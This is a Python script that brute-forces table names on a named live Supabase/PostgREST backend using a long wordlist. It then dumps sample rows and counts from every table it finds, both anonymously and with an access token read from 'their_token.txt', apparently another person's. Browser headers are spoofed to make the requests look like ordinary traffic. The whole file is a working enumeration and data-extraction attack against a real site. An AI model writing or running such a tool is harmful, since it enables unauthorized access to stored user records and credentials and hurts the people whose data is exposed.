#!/usr/bin/env python3
# Full PostgREST relation enumeration via 42P01 "does not exist" oracle (anon), then row probes.
import json, sys, time, urllib.request, urllib.error
sys.stdout.reconfigure(encoding="utf-8")
BASE = "https://cdn.onlyfakeai.ru"
PK = "<publishable-key>"
TA = json.load(open("their_token.txt"))["access_token"]
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
H = {"User-Agent": UA, "Accept": "application/json", "Origin": "https://onlyfakeai.ru",
     "Referer": "https://onlyfakeai.ru/", "apikey": PK}

def get(path, token=None, timeout=20):
    h = dict(H)
    if token: h["Authorization"] = "Bearer " + token
    r = urllib.request.Request(BASE + path, headers=h, method="GET")
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return resp.status, resp.read(3000).decode("utf-8", "replace"), dict(resp.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read(3000).decode("utf-8", "replace"), dict(e.headers)
    except Exception as e:
        return "ERR", repr(e), {}

words = """profiles jobs admin_api_keys messages admin_users admins admin_activity admin_activity_log admin_actions admin_logs
admin_log admin_audit admin_audit_log admin_history admin_credits admin_payments admin_profiles admin_jobs admin_stats
analytics analytics_summary analytics_admin_activity activity activities activity_log user_activity user_activities
users user auth_users user_profiles user_settings user_sessions sessions session refresh_tokens tokens api_keys api_key
api_key_usage api_keys_usage key_usage keys access_tokens credits credit credit_transactions credit_log credit_logs
credit_history credits_log credit_assignments credit_grants generous_credits generation_credits generations
payments payment payment_log payment_logs payment_assignments payment_assignment payment_history transactions transaction
orders order invoices invoice receipts receipt withdrawals withdrawal deposits deposit balances balance wallets wallet
wallet_transactions coupons coupon promo_codes promo_code discounts discount referrals referral affiliates affiliate
plans plan plan_assignments plan_history plan_log plan_prices prices price pricing products product catalog catalog_products
templates template document_templates documents document jobs_queue job_queue queue queues job_stats job_status jobs_status
jobs_archive jobs_history job_history jobs_logs jobs_log workers worker worker_status worker_servers servers server
server_status nodes instances config configs app_config app_settings site_settings settings setting env envs environment
secrets secret vault vault_secrets flags flagged_users flagged flagged_profiles bans banned_users banned ban_log
ban_history moderation moderation_log reports report metrics metric stats statistics daily_stats weekly_stats
monthly_stats time_series dashboards dashboard summary summaries logs log events event webhooks webhook
webhook_events webhook_logs notifications notification newsletter subscribers subscriber emails email_logs email_log
verification_codes password_resets password_reset_tokens otp_codes otp one_time_codes mfa factors identities identity
messages message chat_messages chats chat conversations conversation support_messages support support_tickets tickets
ticket feedback reviews review comments comment uploads upload files file attachments attachment storage_objects objects
storage_buckets bucket buckets photos photo images image portraits portrait backgrounds background templates_public
no_watermark_jobs no_watermark watermark_jobs watermark generated_documents generated_docs documents_generated
document_requests document_jobs result results outputs output renders render previews preview thumbnails thumbnail
rate_limits rate_limit ratelimits quota quotas usage usage_logs usage_stats limits limit restrictions restriction
blacklist blacklisted whitelist whitelisted blocked blocked_users blocks devices device browser user_agents
audit_log audit_logs audit_trail audit history histories changelog versions version migrations schema_migrations
rpc rpcs functions function procedures table tables views view public_profiles public_jobs v_profiles v_jobs
profiles_view jobs_view admin_view admin_profiles_view profiles_with_email profiles_full jobs_full jobs_stats_view
site_content content pages page blog_posts blog menu_settings translations locales languages countries country
document_types document_type doctypes revisions revision years templates_map template_map metadata meta
telegram_users telegram_sessions telegram_messages telegram_bot settings_site site_assets assets asset
s3_files media videos video audio pdfs pdf cards card ids dl_types passport_types residence_types
email_queue emails_queue outbox inbox mail mailer smtp email_templates email_template
promo trial trials trial_users free_trials trial_claims
profile_stats profile_statistics job_statistics profile_activity job_activity job_events job_results
api_key_requests api_key_logs admin_api_key admin_api_keys_log admin_api_key_usage
payments_assignments payment_queues payment_claims claims claim
credit_transactions_v2 ledger ledger_entries accounting accounting_entries finance financial
audit admin_audit_trail admin_sessions admin_tokens superadmins super_admins superadmin
ssn_cards id_cards dl_cards passport_cards residence_permits documents_meta
photo_meta photo_metadata image_meta image_metadata object_meta objects_meta
one_time_tokens recovery_tokens email_change_tokens invite_tokens invites invitations invite
user_metadata profiles_metadata metadata_profiles
backup backups backup_profiles backup_jobs dump dumps export exports export_jobs
settings_v2 config_v2 feature_flags feature_flags_users flags_users experiments
click_events page_views visits visitors analytics_events events_log
""".split()
names = sorted(set(w.lower() for w in words if w))
# add explicit multi-word patterns
extra = []
for a in ["admin", "user", "profile", "job", "credit", "payment", "plan", "api", "telegram", "email", "site", "app", "system"]:
    for b in ["activity", "log", "logs", "history", "stats", "settings", "config", "keys", "data", "records", "events", "requests"]:
        extra += [f"{a}_{b}", f"{a}_{b}s", f"{a}s_{b}"]
names = sorted(set(names + extra))
print(f"probing {len(names)} relation names", flush=True)

existing = []
for i, n in enumerate(names):
    st, body, hd = get(f"/rest/v1/{urllib.parse.quote(n)}?select=*&limit=0")
    if st == 200:
        existing.append(n)
        print(f"[REL] {n} -> 200", flush=True)
    elif st not in (404,):
        print(f"[?] {n} -> {st} {body[:120]}", flush=True)
    if i % 100 == 0: print(f"... {i}/{len(names)} existing={existing}", flush=True)
    time.sleep(0.28)

print("\nEXISTING RELATIONS:", existing)
rows = {}
for n in existing:
    for tok, label in ((None, "anon"), (TA, "auth")):
        st, body, hd = get(f"/rest/v1/{urllib.parse.quote(n)}?select=*&limit=3", tok)
        print(f"\n[{n}][{label}] {st} cr={hd.get('Content-Range')} :: {body[:600]}")
        rows[f"{n}:{label}"] = {"status": st, "body": body[:1200], "content_range": hd.get("Content-Range")}
        time.sleep(0.35)
    # count as anon
    st, body, hd = get(f"/rest/v1/{urllib.parse.quote(n)}?select=*&limit=1", None)
    print(f"[{n}] count-header cr={hd.get('Content-Range')}")
    time.sleep(0.3)

json.dump({"existing": existing, "rows": rows}, open("probe_tables.json", "w"), indent=1)
print("\ndone")
